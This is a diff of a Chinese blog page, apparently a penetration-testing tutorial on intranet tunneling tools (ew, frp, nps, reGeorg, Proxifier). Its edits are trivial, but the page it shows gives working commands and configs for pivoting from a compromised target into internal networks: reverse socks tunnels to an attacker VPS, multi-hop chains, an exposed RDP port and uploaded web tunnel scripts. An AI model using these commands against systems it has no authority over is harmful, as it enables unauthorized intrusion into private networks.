@@ -29,7 +29,7 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.3.0">
+<meta name="generator" content="Hexo 5.4.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 <link rel="alternate" href="/atom.xml" title="Ex1t" type="application/atom+xml">
 </head>
@@ -440,6 +440,7 @@
 <h1 id="二、内网穿透常用工具"><a href="#二、内网穿透常用工具" class="headerlink" title="二、内网穿透常用工具"></a>二、内网穿透常用工具</h1><pre class="line-numbers language-none"><code class="language-none">ew、frp、nps、reGeorg、Proxifier(socks5客户端)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
+
 <h2 id="2-1、ew"><a href="#2-1、ew" class="headerlink" title="2.1、ew"></a>2.1、ew</h2><h3 id="2-1-1、介绍"><a href="#2-1-1、介绍" class="headerlink" title="2.1.1、介绍"></a>2.1.1、介绍</h3><p>​        ew 全称是EarchWorm，是⼀套轻量便携且功能强⼤的⽹络穿透⼯具，基于标准C开发，具有socks5 代理、端⼝转发和端⼝映射三⼤功能，可在复杂⽹络环境下完成⽹络穿透，且⽀持全平台 (Windows/Linux/Mac)。该⼯具能够以“正向”、“反向”、“多级级联”等⽅式打通⼀条⽹络隧道，直达⽹络 深处，⽤蚯蚓独有的⼿段突破⽹络限制，给防⽕墙松⼟。</p>
 <h3 id="2-1-2、语法："><a href="#2-1-2、语法：" class="headerlink" title="2.1.2、语法："></a>2.1.2、语法：</h3><p>ew有六种模式，分别是：</p>
 <pre class="line-numbers language-none"><code class="language-none">ssocksd：是⽤于普通⽹络环境下的正向连接
@@ -453,6 +454,7 @@ lcx_slave：⽤于复杂⽹络环境的多级连接。
 lcx_listen ：⽤于复杂⽹络环境的多级连接。
 
 lcx_tran：⽤于复杂⽹络环境的多级连接。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>常⽤参数 </p>
 <pre class="line-numbers language-none"><code class="language-none">-l：指定要监听的本地端⼝
 
@@ -467,22 +469,27 @@ lcx_tran：⽤于复杂⽹络环境的多级连接。<span aria-hidden="true" cl
 -t：指定超时时⻓,默认为 1000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
+
 <h3 id="2-2-3、实际使用"><a href="#2-2-3、实际使用" class="headerlink" title="2.2.3、实际使用"></a>2.2.3、实际使用</h3><p>当我们拿下了一台目标机器，存在内网。那我们就要建立一条隧道，然后通过代理进去</p>
 <p>当目标机器有公网ip的话</p>
 <pre class="line-numbers language-none"><code class="language-none">VPS：./ew -s rcsocks -l 1080 -e 888  目标机器：./ew -s ssocksd -l 1080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>我们设置代理为目标ip:888，就能让我们的流量进入对方主机中</p>
 <p>大部分为没有公网ip的情况</p>
 <p>（1）、端口映射</p>
 <p>在VPS上执行，监听本地的999端口</p>
 <pre class="line-numbers language-none"><code class="language-none">ew.exe -s ssocksd -l 999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>再服务器A上执行如下命令，将VPS的888端口和服务器的999端口连接起来</p>
 <pre class="line-numbers language-none"><code class="language-none">./ew -s lcx_slave -d 1.1.1.1 -e 888 -f 192.168.10.128 -g 3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>远程桌面连接1.1.1.1:888就是在连接服务器A(192.168.10.128)的3389端口</p>
 <p>（2）、搭建Socks隧道</p>
 <p>1、将VPS的1080端口监听的流量转发到888端口</p>
 <p>2、然后让目标机器主动连接我们vps的888端口</p>
 <p>3、然后我们设置代理为vps的1080端口，那我们从1080端口走的流量就可以转发到888再到目标机器中</p>
 <pre class="line-numbers language-none"><code class="language-none">VPS：./ew -s rcsocks -l 1080 -e 888  目标机器：./ew -s rssocks -d 1.1.1.1 -e 888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 
 
 <p>（3）、二级代理</p>
@@ -504,14 +511,19 @@ lcx_tran：⽤于复杂⽹络环境的多级连接。<span aria-hidden="true" cl
 <p>只有D能访问服务器C的web服务</p>
 <p>首先，在VPS上执行如下命令，将1080端口监听的流量都转发到本地的888端口</p>
 <pre class="line-numbers language-none"><code class="language-none">VPS：./ew -s rcsocks -l 1080 -e 888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>然后在主机A上执行如下命令，作为中转将VPS的888端口和内网主机B的999端口连接起来</p>
 <pre class="line-numbers language-none"><code class="language-none">主机A：./ew -s lcx_slave -d ip(VPS) -e 888 -f ip(主机B) -g 999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>接着在主机B上执行如下命令，将监听的999端口的流量都转发给本地的777端口</p>
 <pre class="line-numbers language-none"><code class="language-none">主机B：ew.exe -s lcx_listen -l 999 -e 777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>最后再主机D上执行如下命令，反弹流量到主机B的777端口</p>
 <pre class="line-numbers language-none"><code class="language-none">主机D：./ew -s rssocks -d ip(主机B) -e 777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>设置代理为vps的1080端口后</p>
 <pre class="line-numbers language-none"><code class="language-none">VPS:1080-&gt;888-&gt;B:999-&gt;777-&gt;D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>就此流量从D走，能够访问服务器C的web服务了</p>
 <h2 id="2-2-frp"><a href="#2-2-frp" class="headerlink" title="2.2 frp"></a>2.2 frp</h2><h3 id="2-2-1、介绍"><a href="#2-2-1、介绍" class="headerlink" title="2.2.1、介绍"></a>2.2.1、介绍</h3><p>​        frp 是一个高性能的反向代理应用，支持 tcp, udp, http, https 协议。支持MAC、Windows、Linux。</p>
 <p>​        frpc是我们的客户端 ，frps是我们的服务端。 frpc.ini是我们的客户端配置文件 。frps.ini是我们的服务端配置文件。</p>
@@ -530,6 +542,7 @@ token = 1q2w3e         #客户端服务端连接的密码
 heartbeat_timeout = 90 #⼼跳超时时间  
 
 max_pool_count = 5     #最⼤同时连接数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>frpc.ini</p>
 <pre class="line-numbers language-none"><code class="language-none">[common]  server_addr = 1.1.1.1  #服务器地址 
 
@@ -546,8 +559,10 @@ local_ip = 127.0.0.1   #需要被代理的ip
 local_port = 3389      #需要被代理的端口 
 
 remote_port = 3389     #映射到服务端的端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h3 id="2-2-3、实际使用-1"><a href="#2-2-3、实际使用-1" class="headerlink" title="2.2.3、实际使用"></a>2.2.3、实际使用</h3><p>ubuntu启动服务端</p>
 <pre class="line-numbers language-none"><code class="language-none">frps -c frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>然后访问服务器ip:管理端口，输入管理账号和密码进入页面</p>
 <p><img src="https://img.ex1t.xyz//frp1.png" alt="frp1"></p>
 <p>可以看到现在是没有任何端口映射的</p>
@@ -570,8 +585,10 @@ local_ip = 127.0.0.1   #需要被代理的ip，
 local_port = 3389      #需要被代理的端口 
 
 remote_port = 10000     #映射到服务端的端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>然后</p>
 <pre class="line-numbers language-none"><code class="language-none">frpc.exe -c frpc.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>这样服务器端就出现了</p>
 <p><img src="https://img.ex1t.xyz//frp3.png" alt="frp3"></p>
 <p>远程连接我服务端的ip:10000，成功提示我输入账号密码</p>
@@ -597,6 +614,7 @@ local_ip = 192.168.107.129   #需要被代理的ip，
  local_port = 3389      #需要被代理的端口 
 
 remote_port = 10001     #映射到服务端的端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>成功</p>
 <p><img src="https://img.ex1t.xyz//frp6.png" alt="frp6"></p>
 <p>（2）、建立socks5隧道</p>
@@ -628,6 +646,7 @@ use_compression = true
 plugin_user= admin     
 
 plugin_passwd= admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>然后我们本机设置socks5代理为：1.1.1.1的10000端口即可。</p>
 <p>这样我们就能够直接上内网了。</p>
 <p>（3）、二级代理</p>
@@ -648,6 +667,7 @@ token=1q2w3e
 remote_port = 10000 
 
 plugin = socks5 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>主机B建立个socks5隧道到主机A的10000端口上</p>
 <p>然后主机A的服务器端frps.ini配置</p>
 <pre class="line-numbers language-none"><code class="language-none">[common]  bind_port = 11111      #绑定的端⼝ 
@@ -663,6 +683,7 @@ token = 1q2w3e         #客户端服务端连接的密码
 heartbeat_timeout = 90 #⼼跳超时时间  
 
 max_pool_count = 5     #最⼤同时连接数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>主机A的frpc.ini配置</p>
 <pre class="line-numbers language-none"><code class="language-none">[common]  server_addr = 1.1.1.1  #服务器地址 
 
@@ -679,6 +700,7 @@ local_ip = 主机B-ip   #需要被代理的ip
 local_port = 10000      #需要被代理的端口 
 
 remote_port = 10001     #映射到服务端的端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>A的10000端口就映射到VPS服务端的10001端口上了</p>
 <p>我们再设置代理为VPS:10001，走的就是主机B的流量。</p>
 <p>（4）、三级代理</p>
@@ -696,15 +718,19 @@ remote_port = 10001     #映射到服务端的端口<span aria-hidden="true" cla
 <p>执行安装命令</p>
 <p>linux</p>
 <pre class="line-numbers language-none"><code class="language-none">sudo ./nps install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>对于windows，管理员身份运行cmd，进入安装目录</p>
 <pre class="line-numbers language-none"><code class="language-none">nps.exe install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>nps默认配置文件使用了80，443，8080，8024端口</p>
 <p>80与443端口为域名解析模式默认端口 8080为web管理访问端口 8024为网桥端口，用于客户端与服务器通信</p>
 <p>启动</p>
 <p>对于linux|darwin </p>
 <pre class="line-numbers language-none"><code class="language-none">sudo nps start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>对于windows，管理员身份运行cmd，进入程序目录 </p>
 <pre class="line-numbers language-none"><code class="language-none">nps.exe start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>windows配置文件位于 C:\Program Files\nps</p>
 <p>linux和darwin位于/etc/nps</p>
 <p>主要是配置文件中要改一改，尤其是账号密码</p>
@@ -712,6 +738,7 @@ remote_port = 10001     #映射到服务端的端口<span aria-hidden="true" cla
 <p> <img src="https://img.ex1t.xyz//nps1.png" alt="nps1"></p>
 <h3 id="2-3-3、实际使用"><a href="#2-3-3、实际使用" class="headerlink" title="2.3.3、实际使用"></a>2.3.3、实际使用</h3><p>192.168.31.146启动服务端</p>
 <pre class="line-numbers language-none"><code class="language-none">sudo nps start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>访问：192.168.31.146:8080</p>
 <p>默认密码：admin/123</p>
 <p>进入主界面</p>
@@ -720,6 +747,7 @@ remote_port = 10001     #映射到服务端的端口<span aria-hidden="true" cla
 <p><img src="https://img.ex1t.xyz//nps3.png" alt="nps3"></p>
 <p>通过下面的命令启动客户端，记得使用管理员cmd</p>
 <pre class="line-numbers language-none"><code class="language-none">npc.exe -server=192.168.31.146:8024 -vkey=ss5hr5jqny68k18s -type=tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>成功上线</p>
 <p><img src="https://img.ex1t.xyz//nps4.png" alt="nps4"></p>
 <p>（1）、端口映射</p>
@@ -757,9 +785,11 @@ remote_port = 10001     #映射到服务端的端口<span aria-hidden="true" cla
 <h3 id="2-4-2、参数介绍"><a href="#2-4-2、参数介绍" class="headerlink" title="2.4.2、参数介绍"></a>2.4.2、参数介绍</h3><pre class="line-numbers language-none"><code class="language-none">-p  代理监听端口
 
 -u  脚本地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <h3 id="2-4-3、实际使用"><a href="#2-4-3、实际使用" class="headerlink" title="2.4.3、实际使用"></a>2.4.3、实际使用</h3><p>首先，上传隧道脚本文件(aspx|ashx|jsp|php) 到web服务器</p>
 <p>本地运行</p>
 <pre class="line-numbers language-none"><code class="language-none">python2 reGeorgSocksProxy.py -p 8888 -u http://目标:8080/tunnel/tunnel.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>然后我们设置socks代理为127.0.0.1:8888就可以进入内网了</p>
 <h2 id="2-5、Proxifier"><a href="#2-5、Proxifier" class="headerlink" title="2.5、Proxifier"></a>2.5、Proxifier</h2><h3 id="2-5-1、介绍"><a href="#2-5-1、介绍" class="headerlink" title="2.5.1、介绍"></a>2.5.1、介绍</h3><p>​        Proxifier是一款功能非常强大的socks5客户端，可以让不支持代理服务器工作的程序变的可行。支持各种操作系统和各代理协议，它的运行模式可以指定端口，指定程序的特点。在内网穿透过程中常用来进行socks代理。</p>
 <h3 id="2-5-2、实际使用"><a href="#2-5-2、实际使用" class="headerlink" title="2.5.2、实际使用"></a>2.5.2、实际使用</h3><p>添加代理服务器</p>
